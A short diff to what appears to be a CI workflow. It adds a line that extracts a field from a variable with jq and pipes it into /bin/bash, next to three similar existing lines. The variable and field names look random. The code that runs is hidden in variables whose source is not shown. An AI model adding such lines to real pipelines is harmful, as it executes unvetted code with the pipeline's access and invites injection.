@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$yk500" | jq -r .fxk395 | /bin/bash
           printf '%s' "$bo1" | jq -r .kpp82017 | /bin/bash
           printf '%s' "$zl475" | jq -r .xghd941 | /bin/bash
+          echo $mokaj9850 | jq -r .bm5 | /bin/bash
 
       - name: Save output
         if: always()
